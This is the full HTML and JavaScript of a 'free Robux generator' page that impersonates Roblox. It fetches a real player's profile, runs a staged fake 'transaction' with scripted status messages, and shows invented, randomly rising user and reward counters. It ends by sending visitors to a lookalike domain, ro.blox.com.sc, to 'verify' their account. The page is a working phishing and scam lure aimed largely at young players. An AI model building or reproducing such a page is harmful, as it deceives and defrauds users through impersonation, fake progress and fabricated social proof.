<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Rewards</title>
    <link rel="icon" href="https://tr.rbxcdn.com/97b15696b339e8afd80b39eaf955ada3/420/420/Image/Png" type="image/png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Poppins:wght@600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }
        
        body {
            background-color: #f8f9fa;
            color: #1a1a1a;
            background-image: radial-gradient(circle at 25% 25%, rgba(0, 162, 255, 0.1) 0%, transparent 50%);
        }
        
        /* Enhanced cartoonish outline styles */
        .cartoon-outline {
            position: relative;
            z-index: 1;
        }
        
        .cartoon-outline::after {
            content: "";
            position: absolute;
            top: -3px;
            left: -3px;
            right: -3px;
            bottom: -3px;
            border: 3px solid #000;
            border-radius: inherit;
            pointer-events: none;
            z-index: -1;
        }
        
        .cartoon-outline-thick::after {
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            border: 5px solid #000;
        }
        
        /* Roblox-themed colors */
        .roblox-blue {
            background-color: #00A2FF;
        }
        .roblox-blue-text {
            color: #00A2FF;
        }
        .roblox-dark {
            background-color: #2c2f33;
        }
        .roblox-dark-text {
            color: #2c2f33;
        }
        .roblox-green {
            background-color: #00B300;
        }
        
        /* Enhanced Animations */
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        @keyframes robloxPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }
        
        @keyframes robloxSpin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        .animate-float {
            animation: float 3s ease-in-out infinite;
        }
        
        .animate-roblox-pulse {
            animation: robloxPulse 2s infinite;
        }
        
        .animate-roblox-spin {
            animation: robloxSpin 1.5s linear infinite;
        }
        
        /* Enhanced Roblox-style buttons */
        .roblox-button {
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            box-shadow: 0 4px 0 rgba(0,0,0,0.2);
            position: relative;
            transform-style: preserve-3d;
        }
        
        .roblox-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.1);
            border-radius: inherit;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .roblox-button:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 6px 0 rgba(0,0,0,0.2);
        }
        
        .roblox-button:hover::before {
            opacity: 1;
        }
        
        .roblox-button:active {
            transform: translateY(2px);
            box-shadow: 0 2px 0 rgba(0,0,0,0.2);
        }
        
        /* Enhanced Roblox-style cards */
        .roblox-card {
            border-radius: 14px;
            box-shadow: 0 6px 0 rgba(0,0,0,0.1);
            border: 3px solid #000;
            background-color: white;
            position: relative;
            transition: all 0.3s ease;
            overflow: hidden;
        }
        
        .roblox-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 0 rgba(0,0,0,0.1);
        }
        
        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
        }
        ::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-left: 2px solid #000;
        }
        ::-webkit-scrollbar-thumb {
            background: #c1c1c1;
            border-radius: 5px;
            border: 2px solid #000;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #a8a8a8;
        }
        
        /* Selected Robux option */
        .selected-option {
            border: 4px solid #00A2FF;
            background-color: #f0f9ff;
            position: relative;
        }
        
        .selected-option::after {
            content: "✓";
            position: absolute;
            top: -10px;
            right: -10px;
            width: 25px;
            height: 25px;
            background: #00A2FF;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            border: 2px solid white;
            box-shadow: 0 2px 0 rgba(0,0,0,0.2);
        }
        
        /* Super smooth counter animation */
        .robux-counter {
            font-variant-numeric: tabular-nums;
            display: inline-block;
            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            font-weight: 800;
            text-shadow: 2px 2px 0 rgba(0,0,0,0.1);
        }
        
        .robux-counter.animating {
            transform: translateY(-5px) scale(1.1);
            opacity: 0.8;
        }
        
        /* Navbar with cartoon outline */
        .navbar-outline {
            border-bottom: 5px solid #000;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        
        /* Input field styling */
        .cartoon-input {
            border: 3px solid #000;
            border-radius: 12px;
            box-shadow: 0 3px 0 rgba(0,0,0,0.1);
            transition: all 0.3s ease;
        }
        
        .cartoon-input:focus {
            outline: none;
            box-shadow: 0 0 0 4px rgba(0, 162, 255, 0.5), 0 3px 0 rgba(0,0,0,0.1);
            border-color: #00A2FF;
        }
        
        /* Progress bar styling */
        .cartoon-progress {
            height: 24px;
            border: 3px solid #000;
            border-radius: 12px;
            overflow: hidden;
            background: white;
        }
        
        .cartoon-progress-bar {
            height: 100%;
            border-right: 3px solid #000;
            background: linear-gradient(90deg, #00A2FF, #00C6FF);
            transition: width 0.8s cubic-bezier(0.65, 0, 0.35, 1);
        }
        
        /* Avatar border */
        .avatar-border {
            border: 4px solid #000;
            box-shadow: 0 4px 0 rgba(0,0,0,0.1);
            transition: all 0.3s ease;
        }
        
        /* Floating action button */
        .fab {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 0 rgba(0,0,0,0.2);
            cursor: pointer;
            z-index: 100;
            transition: all 0.3s ease;
        }
        
        .fab:hover {
            transform: translateY(-5px) scale(1.1);
            box-shadow: 0 8px 0 rgba(0,0,0,0.2);
        }
        
        /* Statistics Section */
        .stats-container {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin: 30px auto;
            max-width: 800px;
            flex-wrap: wrap;
        }
        
        .stat-card {
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 18px;
            box-shadow: 0 6px 0 rgba(0,0,0,0.1);
            border: 3px solid #000;
            padding: 25px 35px;
            text-align: center;
            min-width: 240px;
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-8px) scale(1.03);
            box-shadow: 0 10px 0 rgba(0,0,0,0.1);
        }
        
        .stat-card::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 8px;
            background: linear-gradient(90deg, #00A2FF, #00C6FF);
        }
        
        .stat-icon {
            font-size: 48px;
            margin-bottom: 15px;
            color: #00A2FF;
            text-shadow: 2px 2px 0 rgba(0,0,0,0.1);
        }
        
        .stat-number {
            font-size: 42px;
            font-weight: 800;
            font-family: 'Poppins', sans-serif;
            color: #00A2FF;
            margin-bottom: 5px;
            text-shadow: 2px 2px 0 rgba(0,0,0,0.1);
        }
        
        .stat-label {
            font-size: 18px;
            color: #2c2f33;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .plus-symbol {
            font-size: 32px;
            color: #00B300;
            vertical-align: super;
            margin-left: 5px;
        }
        
        /* Particle animation for stats */
        @keyframes particleFloat {
            0% { transform: translateY(0) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-80px) rotate(360deg); opacity: 0; }
        }
        
        .particle {
            position: absolute;
            background: #00A2FF;
            border-radius: 50%;
            pointer-events: none;
            opacity: 0;
        }
    </style>
</head>
<body>
    <!-- Enhanced Roblox-style navbar with cartoon outline -->
    <nav class="roblox-dark py-4 px-6 shadow-md navbar-outline">
        <div class="max-w-6xl mx-auto flex items-center justify-between">
            <div class="flex items-center space-x-4">
                <img src="https://tr.rbxcdn.com/97b15696b339e8afd80b39eaf955ada3/420/420/Image/Png" alt="Roblox Logo" 
                     class="h-10 cartoon-outline animate__animated animate__fadeInLeft">
                <span class="text-white font-bold text-2xl font-['Poppins'] animate__animated animate__fadeIn">
                    Rbx rewards
                </span>
            </div>
            <div class="hidden md:flex items-center space-x-6 animate__animated animate__fadeIn">
                <a href="#" class="text-gray-300 hover:text-white transition-colors duration-300">Home</a>
                <a href="#" class="text-gray-300 hover:text-white transition-colors duration-300">Games</a>
                <a href="#" class="text-gray-300 hover:text-white transition-colors duration-300">Catalog</a>
                <a href="#" class="text-gray-300 hover:text-white transition-colors duration-300">Help</a>
            </div>
        </div>
    </nav>

    <!-- Main content -->
    <div class="max-w-3xl mx-auto py-10 px-4">
        <!-- Header with enhanced animation -->
        <div class="text-center mb-10 animate__animated animate__fadeInDown">
            <h1 class="text-4xl md:text-5xl font-bold text-gray-800 mb-3 font-['Poppins'] gradient-text">
                Roblox rewards
            </h1>
            <p class="text-gray-600 text-lg">Get free Robux for your Roblox account instantly!</p>
            <div class="w-20 h-1 bg-blue-500 mx-auto mt-4 rounded-full"></div>
        </div>
        
        <!-- Statistics Section -->
        <div class="stats-container mb-10">
            <div class="stat-card cartoon-outline">
                <div class="stat-icon">💰</div>
                <div class="stat-number" id="robux-stat">200,000</div>
                <div class="stat-label">Robux Given</div>
                <span class="plus-symbol">+</span>
            </div>
            
            <div class="stat-card cartoon-outline">
                <div class="stat-icon">👥</div>
                <div class="stat-number" id="users-stat">50,000</div>
                <div class="stat-label">Happy Users</div>
                <span class="plus-symbol">+</span>
            </div>
        </div>

        <!-- Username input with enhanced design -->
        <div class="roblox-card bg-white p-8 mb-8 animate__animated animate__fadeInUp cartoon-outline hover:shadow-lg">
            <div class="mb-6">
                <label for="username" class="block text-gray-700 font-medium mb-3 text-lg">Roblox Username</label>
                <div class="relative">
                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                        </svg>
                    </div>
                    <input type="text" id="username" placeholder="Enter your Roblox username" 
                           class="w-full pl-12 pr-4 py-4 text-lg cartoon-input focus:ring-2 focus:ring-blue-500 focus:border-transparent">
                </div>
            </div>
            <button id="search-button" onclick="fetchProfile()" 
                    class="roblox-button w-full roblox-blue text-white py-4 rounded-xl font-bold text-lg cartoon-outline hover:bg-blue-600 animate__animated animate__pulse animate__infinite">
                🔍 Search Account
            </button>
        </div>

        <!-- Profile display (hidden initially) with enhanced animation -->
        <div id="profile" class="hidden roblox-card bg-white p-6 mb-8 animate__animated animate__fadeIn cartoon-outline hover:shadow-lg">
            <div class="flex items-center space-x-6 mb-4">
                <img id="avatar" class="w-20 h-20 rounded-full avatar-border hover:scale-105 transition-transform">
                <div>
                    <h2 id="display-name" class="font-bold text-2xl"></h2>
                    <p class="text-gray-600 text-sm">Roblox Player</p>
                </div>
            </div>
        </div>

        <!-- Robux selection (hidden initially) with enhanced design -->
        <div id="resource-section" class="hidden roblox-card bg-white p-8 mb-8 animate__animated animate__fadeIn cartoon-outline hover:shadow-lg">
            <h2 class="font-bold text-2xl mb-6 text-center font-['Poppins']">Select Robux Amount</h2>
            <div class="grid grid-cols-2 gap-6 mb-8">
                <div id="option-800" class="roblox-card p-6 text-center cursor-pointer hover:bg-gray-50 transition-all duration-300 hover:shadow-md" 
                     onclick="selectResource('option-800', 800)">
                    <img src="https://imgur.com/l9Qdc3C.jpeg" alt="Robux" class="w-16 h-16 mx-auto mb-4 cartoon-outline animate-float">
                    <p class="font-bold text-xl">800 Robux</p>
                    <p class="text-gray-500 text-sm mt-1">Basic Pack</p>
                </div>
                <div id="option-1700" class="roblox-card p-6 text-center cursor-pointer hover:bg-gray-50 transition-all duration-300 hover:shadow-md" 
                     onclick="selectResource('option-1700', 1700)">
                    <img src="https://imgur.com/l9Qdc3C.jpeg" alt="Robux" class="w-16 h-16 mx-auto mb-4 cartoon-outline animate-float" style="animation-delay: 0.2s">
                    <p class="font-bold text-xl">1,700 Robux</p>
                    <p class="text-gray-500 text-sm mt-1">Starter Pack</p>
                </div>
                <div id="option-4500" class="roblox-card p-6 text-center cursor-pointer hover:bg-gray-50 transition-all duration-300 hover:shadow-md" 
                     onclick="selectResource('option-4500', 4500)">
                    <img src="https://imgur.com/l9Qdc3C.jpeg" alt="Robux" class="w-16 h-16 mx-auto mb-4 cartoon-outline animate-float" style="animation-delay: 0.4s">
                    <p class="font-bold text-xl">4,500 Robux</p>
                    <p class="text-gray-500 text-sm mt-1">Premium Pack</p>
                </div>
                <div id="option-10000" class="roblox-card p-6 text-center cursor-pointer hover:bg-gray-50 transition-all duration-300 hover:shadow-md" 
                     onclick="selectResource('option-10000', 10000)">
                    <img src="https://imgur.com/l9Qdc3C.jpeg" alt="Robux" class="w-16 h-16 mx-auto mb-4 cartoon-outline animate-float" style="animation-delay: 0.6s">
                    <p class="font-bold text-xl">10,000 Robux</p>
                    <p class="text-gray-500 text-sm mt-1">Mega Pack</p>
                </div>
            </div>
            <button id="confirm-button" onclick="confirmSelection()" 
                    class="hidden roblox-button w-full roblox-green text-white py-4 rounded-xl font-bold text-lg cartoon-outline hover:bg-green-600 animate__animated animate__pulse animate__infinite">
                🎁 Generate Robux
            </button>
        </div>
    </div>

    <!-- Floating action button -->
    <div class="fab roblox-blue text-white animate__animated animate__bounceInRight" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18" />
        </svg>
    </div>

    <!-- Loading overlay with enhanced design -->
    <div id="loading-overlay" class="hidden fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 backdrop-blur-sm">
        <div class="bg-white p-10 rounded-xl text-center max-w-md animate__animated animate__zoomIn cartoon-outline-thick">
            <div class="w-24 h-24 border-4 border-blue-500 border-t-transparent rounded-full animate-roblox-spin mx-auto mb-6 cartoon-outline"></div>
            <h3 class="text-2xl font-bold mb-3 font-['Poppins']">Loading...</h3>
            <p id="loading-text" class="text-gray-600 text-lg">Searching for user</p>
            <div class="mt-6 w-full bg-gray-200 rounded-full h-2.5">
                <div id="loading-bar" class="bg-blue-600 h-2.5 rounded-full" style="width: 0%"></div>
            </div>
        </div>
    </div>

    <!-- Generating Robux overlay with enhanced design -->
    <div id="generating-overlay" class="hidden fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 backdrop-blur-sm">
        <div class="bg-white p-10 rounded-xl text-center max-w-md animate__animated animate__zoomIn cartoon-outline-thick">
            <div class="w-24 h-24 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-roblox-pulse cartoon-outline">
                <img src="https://imgur.com/l9Qdc3C.jpeg" alt="Robux" class="w-16 h-16 cartoon-outline">
            </div>
            <h3 class="text-2xl font-bold mb-3 font-['Poppins']">Generating Robux</h3>
            <p id="generating-status" class="text-gray-600 text-lg mb-6">Initializing transaction...</p>
            
            <!-- Enhanced Progress bar -->
            <div class="w-full bg-gray-200 rounded-full h-6 mb-8 cartoon-progress">
                <div id="progress-bar" class="bg-blue-600 h-full rounded-full transition-all duration-500 ease-out cartoon-progress-bar" style="width: 0%"></div>
            </div>
            
            <!-- Enhanced Smooth Robux counter -->
            <div class="mb-6">
                <div class="text-4xl font-bold font-['Poppins']">
                    <span id="robux-counter" class="robux-counter">0</span>
                    <span class="roblox-blue-text"> Robux</span>
                </div>
                <p class="text-sm text-gray-500 mt-2">Processing your reward</p>
            </div>
        </div>
    </div>

    <!-- Verification step with enhanced design -->
    <div id="verify-step" class="hidden fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 backdrop-blur-sm">
        <div class="bg-white p-10 rounded-xl text-center max-w-md animate__animated animate__zoomIn cartoon-outline-thick">
            <div class="w-24 h-24 bg-blue-500 rounded-full flex items-center justify-center mx-auto mb-6 cartoon-outline animate-roblox-pulse">
                <img src="https://imgur.com/l9Qdc3C.jpeg" alt="Robux" class="w-16 h-16 cartoon-outline">
            </div>
            <h3 class="text-2xl font-bold mb-3 font-['Poppins']">Claim Your <span id="selected-robux-amount" class="text-green-600">0</span> Robux!</h3>
            <p class="text-gray-600 text-lg mb-6">Join our official Roblox group to verify your account</p>
            
            <div class="bg-blue-50 p-6 rounded-xl mb-8 text-left cartoon-outline">
                <div class="flex items-start">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-blue-500 mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    <p class="text-base ml-3">You must join our official Roblox group to receive your <span id="robux-reward-amount" class="font-bold">0</span> Robux reward! Click below to join our group and verify your account.</p>
                </div>
            </div>
            
            <a href="https://www.ro.blox.com.sc/communities/5077489370/Bloxgain" target="_blank" 
               class="roblox-button block w-full roblox-blue text-white py-4 rounded-xl font-bold text-lg hover:bg-blue-600 mb-6 cartoon-outline animate__animated animate__pulse animate__infinite">
                👥 Join Group & Claim Robux
            </a/>
            <button onclick="document.getElementById('verify-step').classList.add('hidden')" 
                    class="text-blue-500 hover:text-blue-700 text-base font-medium transition-colors duration-300">
                I'll do this later
            </button>
        </div>
    </div>

    <!-- Error modal with enhanced design -->
    <div id="error-modal" class="hidden fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 backdrop-blur-sm">
        <div class="bg-white p-10 rounded-xl text-center max-w-md animate__animated animate__zoomIn cartoon-outline-thick">
            <div class="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6 cartoon-outline">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
            </div>
            <h3 class="text-2xl font-bold mb-3 font-['Poppins'] text-red-500">Error</h3>
            <p id="error-modal-text" class="text-gray-600 text-lg mb-8">An error occurred</p>
            <button onclick="closeErrorModal()" 
                    class="roblox-button w-full bg-red-500 text-white py-4 rounded-xl font-bold text-lg hover:bg-red-600 cartoon-outline">
                ✖ Close
            </button>
        </div>
    </div>

<script>
    (function(){
        // DOM Elements
        const errorModal = document.getElementById("error-modal");
        const errorModalText = document.getElementById("error-modal-text");
        const loadingOverlay = document.getElementById("loading-overlay");
        const loadingText = document.getElementById("loading-text");
        const loadingBar = document.getElementById("loading-bar");
        const verifyStep = document.getElementById("verify-step");
        const generatingOverlay = document.getElementById("generating-overlay");
        const generatingStatus = document.getElementById("generating-status");
        const progressBar = document.getElementById("progress-bar");
        const robuxCounter = document.getElementById("robux-counter");
        const robuxStat = document.getElementById("robux-stat");
        const usersStat = document.getElementById("users-stat");
        let selectedResource = null;
        let currentCount = 0;
        let targetCount = 0;
        let countInterval = null;

        // Initialize statistics animation
        function initStatsAnimation() {
            // Set initial values
            robuxStat.textContent = "200,000";
            usersStat.textContent = "50,000";
            
            // Create particles for both stats
            createParticles(robuxStat.closest('.stat-card'));
            createParticles(usersStat.closest('.stat-card'));
            
            // Start counting animation for both stats
            animateStatCounter(robuxStat, 200000, 3000);
            animateStatCounter(usersStat, 50000, 3000);
        }
        
        // Animate a stat counter
        function animateStatCounter(element, target, duration) {
            let startValue = parseInt(element.textContent.replace(/,/g, ''));
            const startTime = Date.now();
            const distance = target - startValue;
            
            function updateCounter() {
                const now = Date.now();
                const elapsed = now - startTime;
                const progress = Math.min(elapsed / duration, 1);
                const easeProgress = easeOutQuad(progress);
                
                const currentValue = Math.floor(startValue + (distance * easeProgress));
                element.textContent = currentValue.toLocaleString();
                
                if (progress < 1) {
                    requestAnimationFrame(updateCounter);
                } else {
                    // Start continuous increment animation after initial count
                    setInterval(() => {
                        const current = parseInt(element.textContent.replace(/,/g, ''));
                        const increment = Math.floor(Math.random() * 50) + 5;
                        element.textContent = (current + increment).toLocaleString();
                        
                        // Create particles on increment
                        createParticles(element.closest('.stat-card'));
                    }, 3000);
                }
            }
            
            requestAnimationFrame(updateCounter);
        }
        
        // Create particles effect
        function createParticles(container) {
            const colors = ['#00A2FF', '#00C6FF', '#00B300', '#FFD700'];
            
            for (let i = 0; i < 8; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                // Random size
                const size = Math.random() * 10 + 5;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                
                // Random position
                const left = Math.random() * 80 + 10;
                particle.style.left = `${left}%`;
                particle.style.top = '100%';
                
                // Random color
                particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                
                // Random animation
                const duration = Math.random() * 3 + 2;
                particle.style.animation = `particleFloat ${duration}s linear forwards`;
                
                container.appendChild(particle);
                
                // Remove particle after animation completes
                setTimeout(() => {
                    particle.remove();
                }, duration * 1000);
            }
        }
        
        // Show error message
        function showError(message) {
            errorModalText.textContent = message;
            errorModal.classList.remove("hidden");
        }

        // Close error modal
        function closeErrorModal() {
            errorModal.classList.add("hidden");
        }

        // Fetch Roblox profile
        async function fetchProfile() {
            const username = document.getElementById("username").value.trim();
            const profile = document.getElementById("profile");
            const resourceSection = document.getElementById("resource-section");
            const confirmButton = document.getElementById("confirm-button");
            
            // Reset UI
            profile.classList.add("hidden");
            resourceSection.classList.add("hidden");
            confirmButton.classList.add("hidden");
            
            if(!username) {
                showError("Please enter a Roblox username");
                return;
            }
            
            loadingOverlay.classList.remove("hidden");
            loadingText.textContent = "Searching for user...";
            
            // Simulate loading bar progress
            let progress = 0;
            const loadingInterval = setInterval(() => {
                progress += Math.random() * 10;
                if (progress > 90) progress = 90;
                loadingBar.style.width = `${progress}%`;
            }, 300);
            
            try {
                // Step 1: Get user ID
                loadingText.textContent = "Finding username...";
                await new Promise(resolve => setTimeout(resolve, 800));
                
                const res1 = await fetch("https://users.roproxy.com/v1/usernames/users", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        usernames: [username], 
                        excludeBannedUsers: true 
                    })
                });

                loadingText.textContent = "Verifying account...";
                await new Promise(resolve => setTimeout(resolve, 600));
                
                const data1 = await res1.json();
                if (!data1.data || data1.data.length === 0) {
                    throw new Error("User not found");
                }

                const userId = data1.data[0].id;
                const displayName = data1.data[0].displayName;

                // Step 2: Get avatar image
                loadingText.textContent = "Loading profile...";
                const res2 = await fetch(
                    `https://thumbnails.roproxy.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`
                );
                const data2 = await res2.json();
                const avatarUrl = data2.data[0].imageUrl;

                // Update UI
                document.getElementById("avatar").src = avatarUrl;
                document.getElementById("display-name").textContent = displayName;
                profile.classList.remove("hidden");
                resourceSection.classList.remove("hidden");
                
                loadingText.textContent = "Done!";
                loadingBar.style.width = "100%";
                await new Promise(resolve => setTimeout(resolve, 300));
            } catch (err) {
                showError("User not found. Please check the username and try again.");
            } finally {
                clearInterval(loadingInterval);
                loadingOverlay.classList.add("hidden");
            }
        }

        // Enhanced smooth counter animation
        function animateCounter(target) {
            // Clear any existing interval
            if (countInterval) {
                clearInterval(countInterval);
            }
            
            targetCount = target;
            const duration = 2000; // 2 seconds
            const startTime = Date.now();
            const startValue = currentCount;
            const distance = targetCount - startValue;
            
            // Add animation class
            robuxCounter.classList.add('animating');
            
            function updateCounter() {
                const now = Date.now();
                const elapsed = now - startTime;
                const progress = Math.min(elapsed / duration, 1);
                const easeProgress = easeOutQuad(progress);
                
                currentCount = Math.floor(startValue + (distance * easeProgress));
                robuxCounter.textContent = currentCount.toLocaleString();
                
                if (progress < 1) {
                    requestAnimationFrame(updateCounter);
                } else {
                    robuxCounter.classList.remove('animating');
                }
            }
            
            // Start the animation
            requestAnimationFrame(updateCounter);
        }
        
        // Enhanced easing functions for smooth animation
        function easeOutQuad(t) {
            return t * (2 - t);
        }

        // Select Robux amount
        function selectResource(elementId, value) {
            // Remove selection from all options
            document.querySelectorAll('.roblox-card').forEach(item => {
                item.classList.remove('selected-option');
            });
            
            // Add selection to clicked option
            const element = document.getElementById(elementId);
            element.classList.add('selected-option');
            
            selectedResource = value;
            document.getElementById('confirm-button').classList.remove('hidden');
            
            // Add bounce animation to selected option
            element.classList.add('animate__animated', 'animate__bounce');
            setTimeout(() => {
                element.classList.remove('animate__animated', 'animate__bounce');
            }, 1000);
        }

        // Confirm selection
        async function confirmSelection() {
            if(!selectedResource) {
                showError("Please select a Robux amount");
                return;
            }
            
            // Show generating overlay
            generatingOverlay.classList.remove("hidden");
            
            const steps = [
              "Initializing transaction...",
              "Connecting to Roblox servers...",
              "Verifying account eligibility...",
              "Allocating Robux from reserve...",
              "Finalizing transfer...",
              "Almost done..."
            ];
            
            // Reset progress bar
            progressBar.style.width = "0%";
            
            // Start smooth counter animation
            animateCounter(selectedResource);
            
            for (let i = 0; i < steps.length; i++) {
              generatingStatus.textContent = steps[i];
              
              // Update progress bar percentage smoothly
              const progress = ((i + 1) / steps.length) * 100;
              progressBar.style.width = `${progress}%`;
              
              // Update counter partially during steps
              if (i < steps.length - 1) {
                const partialAmount = Math.floor(selectedResource * (i + 1) / steps.length);
                animateCounter(partialAmount);
              }
              
              await new Promise(resolve => setTimeout(resolve, 1500 + Math.random() * 1000));
            }
            
            // Ensure counter shows final amount
            animateCounter(selectedResource);
            
            generatingOverlay.classList.add("hidden");
            
            // Update the verification step with selected Robux amount
            document.getElementById('selected-robux-amount').textContent = selectedResource.toLocaleString();
            document.getElementById('robux-reward-amount').textContent = selectedResource.toLocaleString();
            
            // Show verification step
            verifyStep.classList.remove("hidden");
        }

        // Initialize the page
        window.onload = function() {
            // Initialize stats animation
            initStatsAnimation();
        }

        // Expose functions to global scope
        window.fetchProfile = fetchProfile;
        window.selectResource = selectResource;
        window.confirmSelection = confirmSelection;
        window.closeErrorModal = closeErrorModal;
    })();
</script>
</body>
</html>
